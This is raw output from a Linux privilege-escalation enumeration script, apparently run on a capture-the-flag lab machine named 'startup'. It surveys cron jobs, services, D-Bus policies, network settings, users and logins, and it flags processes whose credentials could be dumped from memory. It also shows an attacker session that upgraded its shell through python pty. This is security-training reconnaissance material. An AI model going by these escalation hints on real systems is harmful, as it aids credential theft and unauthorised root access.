 168K -rwxr-xr-x 1 root root  165K Apr 13  2016 /usr/sbin/vsftpd

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID       USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd process found (dump creds from memory as root)
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Nov 12  2020 .
drwxr-xr-x 96 root root 4096 Nov 12  2020 ..
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  670 Jun 22  2017 php
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  190 Sep 25  2020 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Nov 12  2020 .
drwxr-xr-x 96 root root 4096 Nov 12  2020 ..
-rwxr-xr-x  1 root root  539 Jul 15  2020 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 May  7  2019 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 Dec  7  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Sep 25  2020 .
drwxr-xr-x 96 root root 4096 Nov 12  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Sep 25  2020 .
drwxr-xr-x 96 root root 4096 Nov 12  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Sep 25  2020 .
drwxr-xr-x 96 root root 4096 Nov 12  2020 ..
-rwxr-xr-x  1 root root  210 Jan 27  2020 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  211 Dec  7  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


╔══════════╣ Services
╚ Search for outdated versions
 [ + ]  acpid
 [ + ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  bootmisc.sh
 [ - ]  checkfs.sh
 [ - ]  checkroot-bootclean.sh
 [ - ]  checkroot.sh
 [ + ]  console-setup
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  grub-common
 [ - ]  hostname.sh
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ + ]  iscsid
 [ + ]  keyboard-setup
 [ - ]  killprocs
 [ + ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ + ]  lxcfs
 [ - ]  lxd
 [ + ]  mdadm
 [ - ]  mdadm-waitidle
 [ - ]  mountall-bootclean.sh
 [ - ]  mountall.sh
 [ - ]  mountdevsubfs.sh
 [ - ]  mountkernfs.sh
 [ - ]  mountnfs-bootclean.sh
 [ - ]  mountnfs.sh
 [ + ]  networking
 [ + ]  ondemand
 [ + ]  open-iscsi
 [ - ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ + ]  rc.local
 [ + ]  resolvconf
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ - ]  sendsigs
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ - ]  umountfs
 [ - ]  umountnfs.sh
 [ - ]  umountroot
 [ + ]  unattended-upgrades
 [ + ]  urandom
 [ - ]  uuidd
 [ + ]  virtualbox-guest-utils
 [ + ]  vsftpd

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
NEXT                         LEFT         LAST                         PASSED       UNIT                         ACTIVATES
Tue 2021-07-27 23:25:14 UTC  5h 7min left Tue 2021-07-27 17:02:16 UTC  1h 15min ago apt-daily.timer              apt-daily.service
Wed 2021-07-28 06:58:49 UTC  12h left     Tue 2021-07-27 17:02:16 UTC  1h 15min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Wed 2021-07-28 09:35:41 UTC  15h left     Tue 2021-07-27 17:02:16 UTC  1h 15min ago motd-news.timer              motd-news.service
Wed 2021-07-28 17:16:00 UTC  22h left     Tue 2021-07-27 17:16:00 UTC  1h 1min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a          n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a          n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

╔══════════╣ HTTP sockets
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
:1.0                                   1 systemd         root             :1.0          init.scope                -          -
:1.1                                1019 systemd-logind  root             :1.1          systemd-logind.service    -          -
:1.2                                1024 accounts-daemon root             :1.2          accounts-daemon.service   -          -
:1.3                                1097 polkitd         root             :1.3          polkitd.service           -          -
:1.358                             10860 busctl          lennie           :1.358        session-5.scope           5          -
:1.4                                1071 unattended-upgr root             :1.4          unattended-upgrades.se... -          -
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -
org.freedesktop.Accounts            1024 accounts-daemon root             :1.2          accounts-daemon.service   -          -
org.freedesktop.DBus                 990 dbus-daemon     messagebus       org.freedesktop.DBus dbus.service              -          -
org.freedesktop.PolicyKit1          1097 polkitd         root             :1.3          polkitd.service           -          -
org.freedesktop.hostname1              - -               -                (activatable) -                         -
org.freedesktop.locale1                - -               -                (activatable) -                         -
org.freedesktop.login1              1019 systemd-logind  root             :1.1          systemd-logind.service    -          -
org.freedesktop.network1               - -               -                (activatable) -                         -
org.freedesktop.resolve1               - -               -                (activatable) -                         -
org.freedesktop.systemd1               1 systemd         root             :1.0          init.scope                -          -
org.freedesktop.timedate1              - -               -                (activatable) -                         -


════════════════════════════════════╣ Network Information ╠════════════════════════════════════
╔══════════╣ Hostname, hosts and DNS
startup
127.0.0.1       localhost

::1     ip6-localhost   ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
127.0.1.1       ubuntu-xenial   ubuntu-xenial

nameserver 10.0.0.2
search eu-west-1.compute.internal
dnsdomainname Not Found

╔══════════╣ Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:f3:cd:d6:4b:43
          inet addr:10.10.128.197  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::f3:cdff:fed6:4b43/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:4407 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3931 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:1419518 (1.4 MB)  TX bytes:759083 (759.0 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)


╔══════════╣ Networks and neighbours
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0
10.10.0.0       *               255.255.0.0     U     0      0        0 eth0
Address                  HWtype  HWaddress           Flags Mask            Iface
ip-10-10-161-36.eu-west  ether   02:82:e1:35:87:c5   C                     eth0
ip-10-10-0-1.eu-west-1.  ether   02:c8:85:b5:5a:aa   C                     eth0

╔══════════╣ Iptables rules
iptables rules Not Found

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -

╔══════════╣ Can I sniff with tcpdump?
No


════════════════════════════════════╣ Users Information ╠════════════════════════════════════
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Clipboard or highlighted text?
xsel and xclip Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)
gdb wasn't found in PATH

╔══════════╣ Checking doas.conf
/etc/doas.conf Not Found

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)
uid=1003(ftpsecure) gid=1003(ftpsecure) groups=1003(ftpsecure)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=112(ftp) gid=118(ftp) groups=118(ftp),33(www-data)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 18:17:58 up  1:16,  1 user,  load average: 0.15, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
lennie   pts/0    10.9.4.122       17:07   14.00s  0.65s  0.50s python -c import pty;pty.spawn("/bin/bash")

╔══════════╣ Last logons
lennie   pts/2        Tue Jul 27 17:27:55 2021 - Tue Jul 27 17:47:44 2021  (00:19)     10.9.4.122
lennie   pts/0        Tue Jul 27 17:07:01 2021   still logged in                       10.9.4.122
reboot   system boot  Tue Jul 27 17:01:06 2021   still running                         0.0.0.0
reboot   system boot  Thu Nov 12 05:08:40 2020 - Thu Nov 12 05:11:05 2020  (00:02)     0.0.0.0
vagrant  pts/0        Thu Nov 12 04:50:52 2020 - crash                     (00:17)     10.0.2.2
reboot   system boot  Thu Nov 12 04:50:21 2020 - Thu Nov 12 05:11:05 2020  (00:20)     0.0.0.0

wtmp begins Thu Nov 12 04:50:21 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest
vagrant          pts/0    10.0.2.2         Thu Nov 12 04:50:52 +0000 2020
lennie           pts/2    10.9.4.122       Tue Jul 27 17:27:55 +0000 2021

╔══════════╣ Password policy
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

lennie@startup:~$
```
